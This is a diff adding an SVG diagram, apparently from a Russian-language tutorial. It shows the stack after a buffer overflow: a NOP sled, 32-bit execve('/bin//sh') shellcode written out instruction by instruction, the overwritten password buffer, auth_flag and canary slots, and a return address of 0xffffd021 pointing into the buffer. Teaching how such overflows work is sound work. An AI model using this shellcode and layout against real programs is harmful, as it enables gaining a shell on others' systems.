@@ -1,0 +1,82 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="860" height="1132" viewBox="0 0 860 1132" role="img">
+<title>Рис. 4. Стек после заливки шеллкода в буфер</title>
+<rect x="1" y="1" width="290" height="42" fill="#e8edf2" stroke="#64748b"/>
+<text x="13" y="29" font-family="sans-serif" font-size="18" fill="#172033" font-weight="bold">Стек</text>
+<rect x="291" y="1" width="568" height="42" fill="#e8edf2" stroke="#64748b"/>
+<text x="303" y="29" font-family="sans-serif" font-size="18" fill="#172033" font-weight="bold">Комментарии</text>
+<rect x="1" y="43" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="71" font-family="monospace" font-size="18" fill="#172033">??</text>
+<rect x="291" y="43" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="71" font-family="sans-serif" font-size="18" fill="#172033">место для вызова функций из libc</text>
+<rect x="1" y="85" width="290" height="136" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="113" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="137" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="161" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="185" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="209" font-family="monospace" font-size="18" fill="#172033">...</text>
+<rect x="291" y="85" width="568" height="136" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="113" font-family="sans-serif" font-size="18" fill="#172033">массив password_buffer ([ebp-0x2c])</text>
+<rect x="1" y="221" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="249" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<rect x="291" y="221" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="263" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="291" font-family="monospace" font-size="18" fill="#172033">xor ecx, ecx</text>
+<rect x="291" y="263" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="291" font-family="sans-serif" font-size="18" fill="#172033">настройка аргументов</text>
+<rect x="1" y="305" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="333" font-family="monospace" font-size="18" fill="#172033">mul ecx</text>
+<rect x="291" y="305" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="347" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="375" font-family="monospace" font-size="18" fill="#172033">push ecx</text>
+<rect x="291" y="347" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="389" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="417" font-family="monospace" font-size="18" fill="#172033">push 0x68732f2f</text>
+<rect x="291" y="389" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="431" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="459" font-family="monospace" font-size="18" fill="#172033">push 0x6e69622f</text>
+<rect x="291" y="431" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="473" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="501" font-family="monospace" font-size="18" fill="#172033">mov ebx, esp</text>
+<rect x="291" y="473" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="515" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="543" font-family="monospace" font-size="18" fill="#172033">mov al, 11</text>
+<rect x="291" y="515" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="557" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="585" font-family="monospace" font-size="18" fill="#172033">int 0x80</text>
+<rect x="291" y="557" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="585" font-family="sans-serif" font-size="18" fill="#172033">вызов syscall’а execve</text>
+<rect x="1" y="599" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="627" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<rect x="291" y="599" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="641" width="290" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="669" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="693" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="717" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="741" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<rect x="291" y="641" width="568" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="669" font-family="sans-serif" font-size="18" fill="#172033">переменная auth_flag ([ebp-0xc])</text>
+<rect x="1" y="753" width="290" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="781" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="805" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="829" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="853" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<rect x="291" y="753" width="568" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="781" font-family="sans-serif" font-size="18" fill="#172033">место под канарейку (см. ниже)</text>
+<rect x="1" y="865" width="290" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="893" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="917" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="941" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="965" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<rect x="291" y="865" width="568" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="893" font-family="sans-serif" font-size="18" fill="#172033">дно кадра стека функции</text>
+<rect x="1" y="977" width="290" height="112" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="1005" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="1029" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="1053" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<text x="13" y="1077" font-family="monospace" font-size="18" fill="#172033">nop</text>
+<rect x="291" y="977" width="568" height="112" fill="#ffffff" stroke="#64748b"/>
+<rect x="1" y="1089" width="290" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="13" y="1117" font-family="monospace" font-size="18" fill="#b91c1c">0xffffd021</text>
+<rect x="291" y="1089" width="568" height="42" fill="#ffffff" stroke="#64748b"/>
+<text x="303" y="1117" font-family="sans-serif" font-size="18" fill="#172033">адрес возврата в main</text>
+</svg>
